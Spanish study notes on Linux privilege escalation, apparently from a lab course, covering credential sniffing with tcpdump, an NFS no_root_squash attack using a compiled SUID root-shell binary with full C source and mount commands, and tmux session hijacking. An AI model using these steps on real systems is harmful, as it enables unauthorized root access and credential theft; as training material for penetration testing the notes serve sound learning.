
## Captura pasiva de trafico

Si `tcpdump` esta instalado, los usuarios sin privs podrian capturar el trafico de red y poder ver creds en texto plano. 

Varias herramietnas para ver creds en capturas de trafico: 

- [net-creds](https://github.com/DanMcInerney/net-creds) 
- [PCredz](https://github.com/lgandx/PCredz)

## Privilegios debiles en NFS

NFS permite a los usuarios acceder a archivos o directorios compartidos a traves de la red

NFS usa 2049 TCP/UDP

Cualquier mount accesible puede ser listado ejecutando:

```
showmount -e IP_SERVERNFS
```
![[Pasted image 20260920133124.png]]


Cuando se crea un volumen NFS pueden establecerse varias opciones:

- root_squash: si usamos root local para acceder a los recursos compartidos, se cambiara al usuario `nfsnobody` que es una cuenta sin privs. Los archivos creados  y subidos por root seran propiedad de este otro usuario impidiendo subir archivos con SUID activo

- not_root_squash: los usuarios que se conecten como usuario root local podran crear archivos en el servidor como root del NFS

```
cat /etc/exports
```
![[Pasted image 20260920133430.png]]

Podriamos crear un binario con SETSUID que ejecute /bin/sh usando nuestro usuario root local. Luego podriamos montar /tmp localmente, copiar el binario de propiedad root local al servidor NFS y establecerle SUID

1. Creamos el binario

```
cat shell.c
gcc shell.c -o shell -static
```
![[Pasted image 20260920133637.png]]

```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

2. Montamos el recurso compartido NFS, copiamos el binario y le establecemos SUID

```
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
```

3. Podemos volver ahora a la sesion del host con privs bajos y ejecutar el binario para obtener una shell root 

```
./shell
```

## Secuestro de sesiones de tmux

Los multiplexores de terminal pueden ser usados para permitir el acceso a múltiples sesiones de terminal dentro de una única sesión

Cuando no se trabaja en una ventana de `tmux`, podemos desvincularnos de la sesión, dejándola aún activa (p. ej., ejecutando un escaneo con `nmap`). Puede que un usuario se deje una ventana con un proceso root con permisos debiles y podemos secuestrarlo

1. Creamos una sesion comparitida y modificamos la propiedad

```
tmux -S /shareds new -s debugsess
chown root:devs /shareds
```

	Si tenemos un usuario de grupo `devs` podemos conectarnos a esta sesion y obtener acceso como root

2. Buscamos cualquier proceso tmux en ejecucion:

```
ps aux | grep tmux
```
![[Pasted image 20260920134336.png]]

3. Confirmamos los permisos

```
ls -la /shareds
```
![[Pasted image 20260920134351.png]]

4. Revisamos nuestra pertenencia a grupos

```
id
```
![[Pasted image 20260920134424.png]]

5. Nos conectamos a la sesion tmux y confirmamos privs root

```
tmux -S /shareds
```
![[Pasted image 20260920134503.png]]
